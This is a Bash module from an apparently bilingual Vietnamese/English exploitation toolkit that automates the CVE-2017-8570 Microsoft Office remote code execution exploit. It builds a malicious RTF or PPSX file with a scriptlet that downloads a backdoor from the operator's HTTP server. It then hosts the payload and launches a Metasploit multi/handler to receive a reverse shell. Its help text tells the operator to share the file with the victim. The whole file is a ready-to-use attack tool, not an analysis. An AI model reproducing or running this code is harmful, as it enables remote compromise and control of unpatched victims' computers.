function module_info {
if [ "$language" = "VN" ]; then
cat << !

        Tên: CVE-2017-8570 | Lỗ hổng thực thi mã từ xa của Microsoft Office
     Mô-đun: exploit/windows/fileformat/CVE-2017-8570_office_rc
   Nền tảng: Windows
  Kiến trúc: x86, x64
  Quyền hạn: Không
    Công bố: 07/11/2017

Cung cấp bởi:
  @rxwx ,@tezukanice

Mục tiêu khả dụng:
   Id  Tên
   --  ----
   0   Tất cả những chương trình Microsoft Office được liệt kê ở dưới :
	   Microsoft Office 2007 Service Pack 3
	   Microsoft Office 2007 Service Pack 3
	   Microsoft Office 2010 Service Pack 2 (32-bit editions)
	   Microsoft Office 2010 Service Pack 2 (64-bit editions)
	   Microsoft Office 2013 RT Service Pack 1
	   Microsoft Office 2013 Service Pack 1 (32-bit editions)
	   Microsoft Office 2013 Service Pack 1 (64-bit editions)
	   Microsoft Office 2016 (32-bit edition)
	   Microsoft Office 2016 (64-bit edition) 
!
module_compare
cat << !
Miêu tả:
   Khai thác này có thể vượi qua bản vá lỗi CVE-2017-0199. Nó sử dụng một
   biệt danh tổng hợp ( a composite moniker ) trong tệp RTF để thực thi tệp
   hoặc thực thi tập lệnh thành phần Windows Script (WSC) trên máy nạn nhân.
   Scriptlet là một tệp XML bao bọc một tập lệnh như VBScript, JavaScript, v.v.
   Tài liệu RTF sử dụng thủ thuật Packager.dll để thả tệp SCT vào thư mục %TEMP% 
   và thực thi nó bằng đặc quyền leo thang mà lỗ hổng cung cấp.
   Khi thực hiện tệp RTF, tệp SCT được nhúng sẽ bị loại bỏ trong 
   thư mục %TEMP%.
   Tệp SCT này sẽ được thực thi bởi một objdata thứ hai trong tài liệu RTF.

Tham khảo:
   https://nvd.nist.gov/vuln/detail/CVE-2017-8570
   https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8570
   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8570
   https://www.zscaler.com/blogs/research/cve-2017-8570-and-cve-2018-0802-exploits-being-used-spread-lokibot
   https://info.menlosecurity.com/rs/281-OWV-899/images/Menlo_MultiStage_Report.pdf
   https://github.com/rxwx/CVE-2017-8570
   https://github.com/tezukanice/Office8570

!
elif [ "$language" = "EN" ]; then
cat << !

       Name: CVE-2017-8570 | Microsoft Office Remote Code Execution Vulnerability
     Module: exploit/windows/fileformat/CVE-2017-8570_office_rce
   Platform: Windows
       Arch: x86, x64
 Privileged: No
  Disclosed: 07/11/2017

Provided by:
  @rxwx ,@tezukanice

Available targets:
   Id  Name
   --  ----
   0   All Microsoft Office programs are listed below:
	   Microsoft Office 2007 Service Pack 3
	   Microsoft Office 2007 Service Pack 3
	   Microsoft Office 2010 Service Pack 2 (32-bit editions)
	   Microsoft Office 2010 Service Pack 2 (64-bit editions)
	   Microsoft Office 2013 RT Service Pack 1
	   Microsoft Office 2013 Service Pack 1 (32-bit editions)
	   Microsoft Office 2013 Service Pack 1 (64-bit editions)
	   Microsoft Office 2016 (32-bit edition)
	   Microsoft Office 2016 (64-bit edition) 
!
module_compare
cat << !
Description:
   This exploit bypasses the Microsoft patch for CVE-2017-0199. It makes use of
   a composite moniker in the RTF file to execute a Windows Script Component (WSC) file
   or scriptlet on the victim’s machine. A scriptlet is a XML file wrapping a script 
   like VBScript, JavaScript, etc.
   The RTF document uses a Packager.dll trick to drop an SCT file into the %TEMP% directory
   and execute it using the escalated privilege that the vulnerability provides.
   Upon executing the RTF file, the embedded SCT file is dropped in the %TEMP% directory.
   This SCT file will be executed by a second objdata in the RTF document.
   After the file moniker CLSID, there is a length field followed by the file path,
   which is going to execute the new object .
   In short, this object will execute the file by using composite moniker in the RTF document.


References:
   https://nvd.nist.gov/vuln/detail/CVE-2017-8570
   https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8570
   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8570
   https://www.zscaler.com/blogs/research/cve-2017-8570-and-cve-2018-0802-exploits-being-used-spread-lokibot
   https://info.menlosecurity.com/rs/281-OWV-899/images/Menlo_MultiStage_Report.pdf
   https://github.com/rxwx/CVE-2017-8570
   https://github.com/tezukanice/Office8570

!
fi

}
############ Hàm gán giá trị các biến #####################
function defaul_module_options {
	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'` > /dev/null 2>&1
	lport="4444"
	file_name="CVE-2017-8570.ppsx"
	type_file="PPSX"
	backdoor_file=""
	srvhost="0.0.0.0"
	srvport="8080"
	url=""
	x="0"
	attack_type="Lan"
	publichost=`dig +short myip.opendns.com @resolver1.opendns.com`
	publicport=`echo $lport`
	file_name_lenght=18
	backdoor_file_lenght=18
	publichost_lenght=18
}
############# Hàm kiểm tra chọn lựa để in ra màng hình ###############
function module_compare {
i_characters="i"
g_characters="g"	
_characters1="-"
_characters2="-"
if [[ $file_name_lenght -le 18 ]]; then
	file_name_lenght=18
fi
if [[ $publichost_lenght -le 18 ]]; then
	publichost_lenght=18
fi
if [[ $backdoor_file_lenght -le 18 ]]; then
	backdoor_file_lenght=18
fi
plus_strings=`expr $backdoor_file_lenght + $file_name_lenght + $publichost_lenght`
if  [[ "$plus_strings" -le 54 ]]; then
		module1
else
		module2
fi
}
############### Hàm nhận giá trị nhận vào của biến ###################
function set_module {
		if [[ "$new_processing_variables" = "file_name" ]] || [[ "$new_processing_variables" = "FILE_NAME" ]] || [[ "$new_processing_variables" = "File_name" ]]; then
			############# xóa biến và gán lại biến ################
			unset file_name
			file_name=$module_set
			file_name_lenght=`echo $file_name | awk '{print length}'`
			if [[ $file_name_lenght -le 18 ]]; then
				file_name_lenght=18
			fi
			################# nhận dạng đuôi file ra ###################
			type=`echo $file_name | cut -d'.' -f2` > /dev/null 2>&1
			if  [ "$type" = "rtf" ]; then
				type_file="RTF"
			elif [ "$type" = "ppsx" ]; then
				type_file="PPSX"
			elif [ "$type" = "doc" ]; then
				type_file="DOC"
			elif [ "$type" = "docx" ]; then
				type_file="DOCX"
			fi
		elif [[ "$new_processing_variables" = "backdoor_file" ]] || [[ "$new_processing_variables" = "BACKDOOR_FILE" ]] || [[ "$new_processing_variables" = "Backdoor_file" ]]; then
			unset backdoor_file
			backdoor_file=`echo "$module_set" | cut -d "'" -f2` > /dev/null 2>&1
			################ bỏ đi ký tự cuối ####################
			backdoor_name=${backdoor_file##*/}
			backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
			if [[ $backdoor_file_lenght -le 18 ]]; then
				backdoor_file_lenght=18
			fi
		elif [[ "$new_processing_variables" = "srvhost" ]] || [[ "$new_processing_variables" = "SRVHOST" ]] || [[ "$new_processing_variables" = "Srvhost" ]]; then
			unset srvhost
			srvhost="$module_set"
		elif [[ "$new_processing_variables" = "srvport" ]] || [[ "$new_processing_variables" = "SRVPORT" ]] || [[ "$new_processing_variables" = "Srvport" ]]; then
			unset srvport
			srvport="$module_set"
		elif [[ "$new_processing_variables" = "publichost" ]] || [[ "$new_processing_variables" = "PUBLICHOST" ]] || [[ "$new_processing_variables" = "Publichost" ]]; then
			unset publichost
			publichost="$module_set"
			publichost_lenght=`echo $publichost | awk '{print length}'`
			if [[ $publichost_lenght -le 18 ]]; then
				publichost_lenght=18
			fi
		elif [[ "$new_processing_variables" = "publicport" ]] || [[ "$new_processing_variables" = "PUBLICPORT" ]] || [[ "$new_processing_variables" = "Publicport" ]]; then
			unset publicport
			publicport="$module_set"
		elif [[ "$new_processing_variables" = "attack_type" ]] || [[ "$new_processing_variables" = "ATTACK_TYPE" ]] || [[ "$new_processing_variables" = "Attack_type" ]]; then
			if [[ "$module_set" = "lan" ]] || [[ "$module_set" = "LAN" ]] || [[ "$module_set" = "Lan" ]]; then
				unset attack_type
				attack_type="$module_set"
			elif [[ "$module_set" = "wan" ]] || [[ "$module_set" = "WAN" ]] || [[ "$module_set" = "Wan" ]]; then
				unset attack_type
				attack_type="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		fi
}

##################### Hàm canh lề cho biến ###################
############# Khi các biến có độ dài nhỏ hơn 18 ###############
function module1 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset integer
		none=" "
		myvar=""
	}
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
	integer=`expr 20 - $file_name_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	file_name=$file_name$myvar
unset_value

backdoor_file=`echo $backdoor_file`
backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
	integer=`expr 20 - $backdoor_file_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	backdoor_file=$backdoor_file$myvar
unset_value
attack_type=`echo $attack_type`
attack_type_lenght=`echo $attack_type | awk '{print length}'`
	integer=`expr 20 - $attack_type_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	attack_type=$attack_type$myvar
unset_value
srvhost=`echo $srvhost`
srvhost_lenght=`echo $srvhost | awk '{print length}'`
	integer=`expr 20 - $srvhost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	srvhost=$srvhost$myvar
unset_value
srvport=`echo $srvport`
srvport_lenght=`echo $srvport | awk '{print length}'`
	integer=`expr 20 - $srvport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	srvport=$srvport$myvar
unset_value
publichost=`echo $publichost`
publichost_lenght=`echo $publichost | awk '{print length}'`
	integer=`expr 20 - $publichost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	publichost=$publichost$myvar
unset_value
publicport=`echo $publicport`
publicport_lenght=`echo $publicport | awk '{print length}'`
	integer=`expr 20 - $publicport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	publicport=$publicport$myvar
unset_value
module_banner_1
}
function module2 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset subtract_compare_value
		none=" "
		myvar=""
	}
publichost=`echo $publichost`
publichost_lenght=`echo $publichost | awk '{print length}'`
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
backdoor_file=`echo $backdoor_file`
backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`

subtract_compare1=`expr $publichost_lenght - $backdoor_file_lenght`
subtract_compare2=`expr $file_name_lenght - $backdoor_file_lenght`
subtract_compare3=`expr $file_name_lenght - $publichost_lenght`

if [[ $subtract_compare1 -gt 0 ]]; then
	if [[ $subtract_compare3 -lt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $file_name_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
	
		greater_value=$publichost_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$file_name_lenght
	fi
elif [[ $subtract_compare2 -gt 0 ]]; then
	if [[ $subtract_compare3 -gt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
	
		greater_value=$file_name_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $file_name_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$publichost_lenght
	fi
else
	if [[ $subtract_compare2 -lt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $backdoor_file_lenght - $file_name_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $backdoor_file_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
	
		greater_value=$backdoor_file_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$file_name_lenght
	fi
fi
srvhost=`echo $srvhost`
srvhost_lenght=`echo $srvhost | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $srvhost_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	srvhost=$srvhost$myvar
unset_value
srvport=`echo $srvport`
srvport_lenght=`echo $srvport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $srvport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	srvport=$srvport$myvar
unset_value
publicport=`echo $publicport`
publicport_lenght=`echo $publicport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $publicport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	publicport=$publicport$myvar
unset_value
attack_type=`echo $attack_type`
attack_type_lenght=`echo $attack_type | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $attack_type_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	attack_type=$attack_type$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	i_characters=$i_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	g_characters=$g_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 5`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters1=$_characters1$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 3`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters2=$_characters2$myvar
unset_value

module_banner_2
}
function module_banner_1 {
if [ "$language" = "VN" ]; then
yes="  Có "
no="  Không "
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2017-8570_office_rce):

   Tên       	  Thiết lập hiện tại 	Yêu cầu   Miêu tả
   ----       	  ---------------- 	--------  -----------
   FILE_NAME      $file_name $no   Tên của tệp RTF / PPSX độc hại (Hãy chia sẻ tệp này!).
   BACKDOOR_FILE  $backdoor_file $yes      Đường dẫn đến tệp thực thi / shell meterpreter / tải trọng.
   SRVHOST        $srvhost $no   Máy chủ lắng nghe. Đây phải là một địa chỉ trên máy cục bộ hoặc 0.0.0.0
   SRVPORT        $srvport $no   Cổng lắng nge.
   ATTACK_TYPE    $attack_type $no   Kiểu tấn công (Lan/Wan).
!
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/fileformat/CVE-2017-8570_office_rce):

   Name           Current Setting 	Required  Description
   ----           --------------- 	--------  -----------
   FILE_NAME      $file_name $no      Name of malicious RTF/PPSX file (Share this file with victim).
   BACKDOOR_FILE  $backdoor_file $yes      Path of an executable file / meterpreter shell / payload.
   SRVHOST        $srvhost $no      The local host to listen on.This must be an address on the local machine or 0.0.0.0
   SRVPORT        $srvport $no      The local port to listen on.
   ATTACK_TYPE    $attack_type $no      Attack type (Lan/Wan).
!
fi
attack_value=`echo $attack_type`
if [ "$language" = "VN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes      Máy chủ lắng nghe trên WAN.
   PUBLICPORT     $publicport $yes      Cổng lắng nge trên WAN,cổng này phải trùng với cổng khởi tạo trên tải trọng.

!
	else echo ""
	fi
elif [ "$language" = "EN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes      The public host to listen on.
   PUBLICPORT     $publicport $yes      The public port to listen on,this port must match the port created on the payload.

!
	else echo ""
	fi
fi
		
}
function module_banner_2 {
if [ "$language" = "VN" ]; then
yes="  Có "
no="  Không "
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2017-8570_office_rce):

   Tên       	  Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----       	  ---------------${_characters1}--------  -----------
   FILE_NAME      $file_name $no   Tên của tệp RTF / PPSX độc hại (Hãy chia sẻ tệp này!).
   BACKDOOR_FILE  $backdoor_file $yes      Đường dẫn đến tệp thực thi / shell meterpreter / tải trọng.
   SRVHOST        $srvhost $no   Máy chủ lắng nghe. Đây phải là một địa chỉ trên máy cục bộ hoặc 0.0.0.0
   SRVPORT        $srvport $no   Cổng lắng nge.
   ATTACK_TYPE    $attack_type $no   Kiểu tấn công (Lan/Wan).
!
elif [ "$language" = "EN" ]; then
yes=" yes"
no=" no "
cat << !

Module options (exploit/windows/fileformat/CVE-2017-8570_office_rce):

   Name           Current Setting${g_characters}Required  Description
   ----           ---------------${_characters2}--------  -----------
   FILE_NAME      $file_name$no      Name of malicious RTF/PPSX file (Share this file with victim).
   BACKDOOR_FILE  $backdoor_file$yes      Path of an executable file / meterpreter shell / payload.
   SRVHOST        $srvhost$no      The local host to listen on.This must be an address on the local machine or 0.0.0.0
   SRVPORT        $srvport$no      The local port to listen on.
   ATTACK_TYPE    $attack_type$no      Attack type (Lan/Wan).
!
fi
attack_value=`echo $attack_type`
if [ "$language" = "VN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes      Máy chủ lắng nghe trên WAN, mặc định là địa chỉ IP của router.
   PUBLICPORT     $publicport $yes      Cổng lắng nge trên WAN, cổng này phải trùng với cổng khởi tạo trên tải trọng.

!
	else echo ""
	fi
elif [ "$language" = "EN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost$yes      The public host to listen on, default is the IP public address.
   PUBLICPORT     $publicport$yes      The public port to listen on, this port must match the port created on the payload.

!
	else echo ""
	fi
fi
		
}
################# targets ###################
#############################################
function show_targets {
if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Các phiên bản chưa được vá lỗi của Microsoft Office 2007,2010,2013,2016

!
elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   Unpatched versions of Microsoft Office 2007,2010,2013,2016

!
fi
}

function target {
if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Các phiên bản chưa được vá lỗi của Microsoft Office 2007,2010,2013,2016

!
elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   Unpatched versions of Microsoft Office 2007,2010,2013,2016

!
fi
}
################# payload list ###################
#############################################
function payload_list {
path_present=`pwd`
payload_list_file="$path_present/Config/payloads"
cat $payload_data | grep -i "   generic/" > $payload_list_file
cat $payload_data | grep -i "   windows/" >> $payload_list_file
echo "" >> $payload_list_file
}
function output_massage {
	function unset_value {
			unset none
			unset myvar
			unset integer
			none=" "
			myvar=""
		}
none=" "
myvar=""
file_output="$output_file/$file_name"
file_output_lenght=`echo $file_output | awk '{print length}'`
	integer=`expr 70 - $file_output_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	file_output=$file_output$myvar
unset_value
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
	integer=`expr 70 - $file_name_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	file_name=$file_name$myvar
unset_value
type_file_display=`echo $type_file`
type_file_display_lenght=`echo $type_file_display | awk '{print length}'`
	integer=`expr 70 - $type_file_display_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	type_file_display=$type_file_display$myvar
unset_value
echo -e "$orange"
if [ "$language" = "VN" ]; then
cat << !

  ,-----------------++------------------------------------------------------------------------.
  | Tên file        ||  $file_name|
  | Loại tệp        ||  $type_file_display|
  | Vị trí lưu file ||  $file_output|
  '-----------------++------------------------------------------------------------------------'


!
elif [ "$language" = "EN" ]; then
cat << !

  ,-----------------++------------------------------------------------------------------------.
  | File name       ||  $file_name|
  | File type       ||  $type_file_display|
  | File location   ||  $file_output|
  '-----------------++------------------------------------------------------------------------'


!
fi
echo -e "$RESET"
}
function out_value {
backdoor_file=`echo $backdoor_file`
file_name=`echo $file_name`
attack_type=`echo $attack_type`
publichost=`echo $publichost`
publicport=`echo $publicport`
paylo=`echo $paylo`
lhost=`echo $lhost`
lport=`echo $lport`
host=`echo $srvhost`
type_file=`echo $type_file`
if [ "$host" = "0.0.0.0" ]; then
	srvhost=`echo $lhost`
else
	srvhost=$host
fi
srvport=`echo $srvport`
}
function module_run {
out_value
module_path_present=`pwd`
module_path_rc_file="$module_path_present/Config"
rc_file="$module_path_rc_file/file.rc"
rm -rf $rc_file > /dev/null 2>&1
touch $rc_file > /dev/null 2>&1
	echo "use multi/handler" >> $rc_file
}
function attack {
#####################
path_present=`pwd`
cd $path_present/../../output
output_file=`pwd`
###################
path_tool="$output_file/../Tools/Vulnerability-Exploit/CVE-2017-8570/"
if [[ "$paylo" != "" ]]; then
	if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
		url="http://$publichost:$srvport/test.doc"
		echo "set ReverseListenerBindAddress $lhost" >> $rc_file
		echo "set LHOST $publichost" >> $rc_file
		echo "set LPORT $lport" >> $rc_file
	else
		url="http://$srvhost:$srvport/test.doc"
		echo "set LHOST $lhost" >> $rc_file
		echo "set LPORT $lport" >> $rc_file
	fi
	echo "exploit -j -z" >> $rc_file
	cp $backdoor_file $path_tool > /dev/null 2>&1
	cd $path_tool
	service postgresql start
	echo -e "${BlueF}[*]$RESET $generate_file $file_name"
	if [ "$type_file" = "PPSX" ]; then
		xterm -e python cve-2017-8570_ppsx.py -M gen -w $file_name -u $url
	else
		if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
			url="http://$publichost:$srvport/$backdoor_name"
			sed "s|url|$url|" calc.txt > test.sct
		else
			url="http://$srvhost:$srvport/$backdoor_name"
			sed "s|url|$url|" calc.txt > test.sct
		fi
		xterm -e python cve-2017-8570_rtf.py -s test.sct -o $file_name
	fi
	check_file=`find -name $file_name`
	if [[ "$check_file" != "" ]]; then
	sleep 1
	echo -e "${BlueF}[*]$RESET $done1 $file_name"
	mv $path_tool/$file_name $output_file
	output_massage
		if [ "$type_file" = "PPSX" ]; then 
			if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
			echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
			xterm -e python cve-2017-8570_ppsx.py -M exp -e http://$srvhost:$srvport/$backdoor_name -l $backdoor_file -p $srvport &
			cd ../../../Victim
			else
			echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
			xterm -e python cve-2017-8570_ppsx.py -M exp -e http://$srvhost:$srvport/$backdoor_name -l $backdoor_file -p $srvport &
			cd ../../../Victim
			fi
		else
			sleep 1
			echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
			xterm -e python2 -m SimpleHTTPServer $srvport &
			cd ../../../Victim
		fi
		echo -e "${BlueF}[!]$RESET $msf_start ${red}Metasploit Framework${RESET}"
		msfconsole -q -r $rc_file
		rm $path_tool/$backdoor_name > /dev/null 2>&1
		rm $path_tool/test.sct > /dev/null 2>&1
		killall xterm > /dev/null 2>&1
		cd $path_present
	else
		rm $path_tool/$backdoor_name > /dev/null 2>&1
		rm $path_tool/test.sct > /dev/null 2>&1
		killall xterm > /dev/null 2>&1
		cd $path_present
		echo -e "${red}[-]$RESET $error_gen_file"
	fi
else
	if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
		url="http://$publichost:$srvport/test.doc"
	else
		url="http://$srvhost:$srvport/test.doc"
	fi
	cp $backdoor_file $path_tool > /dev/null 2>&1
	cd $path_tool
	echo -e "${BlueF}[*]$RESET $generate_file $file_name"
	if [ "$type_file" = "PPSX" ]; then
		xterm -e python cve-2017-8570_ppsx.py -M gen -w $file_name -u $url
	else
		if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
			url="http://$publichost:$srvport/$backdoor_name"
			sed "s|url|$url|" calc.txt > test.sct
		else
			url="http://$srvhost:$srvport/$backdoor_name"
			sed "s|url|$url|" calc.txt > test.sct
		fi
		xterm -e python cve-2017-8570_rtf.py -s test.sct -o $file_name
	fi
	check_file=`find -name $file_name`
	if [[ "$check_file" != "" ]]; then
	sleep 1
	echo -e "${BlueF}[*]$RESET $done1 $file_name"
	mv $path_tool/$file_name $output_file
	output_massage
		if [ "$type_file" = "PPSX" ]; then 
			if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
			echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
			xterm -e python cve-2017-8570_ppsx.py -M exp -e http://$srvhost:$srvport/$backdoor_name -l $backdoor_file -p $srvport
			else
			echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
			xterm -e python cve-2017-8570_ppsx.py -M exp -e http://$srvhost:$srvport/$backdoor_name -l $backdoor_file -p $srvport
			fi
		else
			sleep 1
			echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
			xterm -e python2 -m SimpleHTTPServer $srvport
			cd ../../../Victim
		fi
		rm $path_tool/$backdoor_name > /dev/null 2>&1
		killall xterm > /dev/null 2>&1
		cd $path_present
	else
		rm $path_tool/$backdoor_name > /dev/null 2>&1
		killall xterm > /dev/null 2>&1
		cd $path_present
		echo -e "${red}[-]$RESET $error_gen_file"
	fi
fi
cd $path_present
}
